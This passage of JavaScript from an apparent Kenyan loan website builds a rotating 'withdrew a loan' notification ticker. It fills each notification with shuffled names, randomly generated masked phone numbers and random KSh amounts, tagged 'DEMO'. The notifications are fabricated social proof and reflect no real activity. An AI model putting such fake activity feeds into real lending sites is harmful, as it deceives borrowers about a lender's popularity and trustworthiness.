  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [arr[i], arr[j]] = [arr[j], arr[i]];
  }
  return arr;
}
function nextTickerName() {
  if (!tickerQueue.length) tickerQueue = shuffledNameQueue();
  return tickerQueue.pop();
}
function maskedDemoPhone() {
  return `07${Math.floor(10 + Math.random() * 29)}•••${Math.floor(10 + Math.random() * 29)}`;
}
function randomTickerAmount() {
  const t = TIERS[Math.floor(Math.random() * TIERS.length)];
  return roundTo50(t.min + Math.random() * (t.max - t.min));
}
function showWithdrawalToast() {
  let toast = document.getElementById("withdrawalToast");
  if (!toast) {
    toast = document.createElement("div");
    toast.id = "withdrawalToast";
    document.body.appendChild(toast);
  }
  const name = nextTickerName();
  const phone = maskedDemoPhone();
  const amount = randomTickerAmount();
  toast.innerHTML = `
    <span class="dot"></span>
    <span class="toast-text">
      <strong>${name} ${phone}</strong> withdrew a loan of <strong>KSh ${amount.toLocaleString()}</strong>
      <span class="toast-demo">DEMO</span>
    </span>`;
  toast.classList.add("show");
  clearTimeout(toast._hideTimer);
  toast._hideTimer = setTimeout(() => toast.classList.remove("show"), 4000);
}
function startWithdrawalTicker() {
  stopWithdrawalTicker();
  tickerQueue = shuffledNameQueue();
  showWithdrawalToast();
  tickerTimer = setInterval(showWithdrawalToast, TICKER_INTERVAL_MS);
}
function stopWithdrawalTicker() {
  if (tickerTimer) { clearInterval(tickerTimer); tickerTimer = null; }
  document.getElementById("withdrawalToast")?.classList.remove("show");
}

window.onload = function () {
  updateCalculator();
  showSection("landing");
  const y = document.getElementById("footer-year");
  if (y) y.textContent = new Date().getFullYear();
};